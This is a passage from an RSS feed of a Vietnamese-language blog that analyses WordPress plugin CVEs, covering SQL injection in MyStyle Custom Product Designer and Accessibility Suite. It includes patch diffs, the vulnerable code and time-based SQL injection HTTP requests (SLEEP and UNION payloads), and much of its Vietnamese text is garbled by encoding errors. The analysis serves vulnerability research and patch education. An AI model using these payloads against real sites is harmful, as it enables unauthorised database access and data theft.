ƒë·ªông.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/time_resp.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ ph·∫£n h·ªìi th·ªùi gian&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ki·ªÉm tra ƒë·ªô tr·ªÖ th·ªùi gian&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Kh√¥ng th√™m d·∫•u comment (&lt;code&gt;--&lt;/code&gt;) sau &lt;code&gt;SLEEP()&lt;/code&gt; v√¨ s·∫Ω khi·∫øn SQL parser l·ªói do xu·ªëng d√≤ng gi·ªØa &lt;code&gt;ASC&lt;/code&gt; v√† &lt;code&gt;OFFSET&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/debug.png&#34;&#xA;    alt=&#34;Debug l·ªói c√∫ ph√°p&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug l·ªói&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;l·∫•y-k√Ω-t·ª±-ƒë·∫ßu-ti√™n-c·ªßa-t√™n-c∆°-s·ªü-d·ªØ-li·ªáu&#34;&gt;&lt;span&gt;L·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n c∆° s·ªü d·ªØ li·ªáu&lt;/span&gt;&#xA;  &lt;a href=&#34;#l%e1%ba%a5y-k%c3%bd-t%e1%bb%b1-%c4%91%e1%ba%a7u-ti%c3%aan-c%e1%bb%a7a-t%c3%aan-c%c6%a1-s%e1%bb%9f-d%e1%bb%af-li%e1%bb%87u&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu ph·∫£n h·ªìi ch·∫≠m ‚Üí k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n database l√† &lt;strong&gt;w&lt;/strong&gt;.&#xA;K·ªπ thu·∫≠t n√†y c√≥ th·ªÉ ƒë∆∞·ª£c m·ªü r·ªông ƒë·ªÉ tr√≠ch xu·∫•t to√†n b·ªô t√™n c∆° s·ªü d·ªØ li·ªáu ho·∫∑c b·∫£ng d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-48281&lt;/strong&gt; trong plugin &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; (&amp;lt;= 3.21.1) xu·∫•t ph√°t t·ª´ vi·ªác ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu ng∆∞·ªùi d√πng v√†o truy v·∫•n SQL m√† kh√¥ng x√°c th·ª±c ƒë√∫ng c√°ch.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;3.21.2&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch √°p d·ª•ng danh s√°ch c·ªôt cho ph√©p (&lt;code&gt;whitelist&lt;/code&gt;) v√† ki·ªÉm tra gi√° tr·ªã ƒë·∫ßu v√†o.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B√†i h·ªçc r√∫t ra:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c d·ªØ li·ªáu ƒë·∫ßu v√†o.&lt;/li&gt;&#xA;&lt;li&gt;Khi l√†m vi·ªác v·ªõi c∆° s·ªü d·ªØ li·ªáu trong WordPress, &lt;strong&gt;b·∫Øt bu·ªôc d√πng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin &amp;lt;= 3.21.1 SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32650 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-26-cve-2025-32650/</link>
      <pubDate>Fri, 26 Sep 2025 10:36:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-26-cve-2025-32650/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Accessibility Suite&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;4.19&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32650&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32650&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Suite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Accessibility Suite&lt;/strong&gt;:  v4.18(vul) v√† v4.19(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho &lt;strong&gt;input&lt;/strong&gt; v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng &lt;code&gt;prepare()&lt;/code&gt; ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $list = json_decode(&#xA;        $wpdb-&amp;gt;get_results($wpdb-&amp;gt;prepare(&amp;#34;SELECT list FROM  $table_name WHERE scan_id = $scan_id&amp;#34;))[0]-&amp;gt;list // phpcs:ignore&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ truy·ªÅn &lt;code&gt;$scan_id&lt;/code&gt; nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $scan_id = absint($scan_id); // Ensure scan_id is a positive integer&#xA;    &#xA;    if (!$scan_id) {&#xA;        return [&amp;#34;status&amp;#34; =&amp;gt; &amp;#34;failed&amp;#34;, &amp;#34;msg&amp;#34; =&amp;gt; &amp;#34;Invalid scan ID&amp;#34;];&#xA;    }&#xA;    &#xA;    // Get list using properly prepared query&#xA;    $query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT list FROM %i WHERE scan_id = %d&amp;#34;,&#xA;        $table_name,&#xA;        $scan_id&#xA;    );&#xA;    &#xA;    $result = $wpdb-&amp;gt;get_results($query);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/patch_diff.png&#34;&#xA;    alt=&#34;patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh &lt;code&gt;save_false_positive&lt;/code&gt; c·ªßa class &lt;code&gt;Helper&lt;/code&gt; thu·ªôc file &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a &lt;code&gt;save_false_positive&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/search_1.png&#34;&#xA;    alt=&#34;search save_false_positive&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search save_false_positive&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;save_false_positive&lt;/code&gt; ƒë∆∞·ª£c &lt;code&gt;callback&lt;/code&gt; c·ªßa action hook &lt;code&gt;wp_ajax_ONLINE_ADAv4/save_false_positive&lt;/code&gt; g·ªçi.&lt;/p&gt;&#xA;&lt;p&gt;Khi &lt;strong&gt;POST&lt;/strong&gt; request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action&lt;/code&gt;=&lt;code&gt;ONLINE_ADAv4/save_false_positive&lt;/code&gt; callback ƒë∆∞·ª£c g·ªçi.&#xA;Trong request c·∫ßn 2 &lt;strong&gt;POST&lt;/strong&gt; param &lt;code&gt;issue_id&lt;/code&gt; v√† &lt;code&gt;scan_id&lt;/code&gt;. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;status&amp;#34;:&amp;#34;failed&amp;#34;,&amp;#34;msg&amp;#34;:&amp;#34;Did not receive the scan ID or the issue ID&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;save_false_positive&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë &lt;code&gt;issue_id&lt;/code&gt; v√† &lt;code&gt;scan_id&lt;/code&gt;. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;magic quotes&lt;/strong&gt;&lt;/a&gt; trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;strong&gt;POST&lt;/strong&gt; request.&lt;/p&gt;&#xA;&lt;p&gt;·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(! is_admin()) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i &lt;strong&gt;POST request&lt;/strong&gt; ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi &lt;code&gt;role:subcriber&lt;/code&gt; c√≥ &lt;strong&gt;privilege th·∫•p nh·∫•t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ &lt;strong&gt;privilege&lt;/strong&gt; role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user &lt;code&gt;subcriber&lt;/code&gt; g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT list FROM  wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/time_response.png&#34;&#xA;    alt=&#34;time response with SQLi payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Time response with SQLi payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; payload ho·∫°t ƒë·ªông.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt;: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, 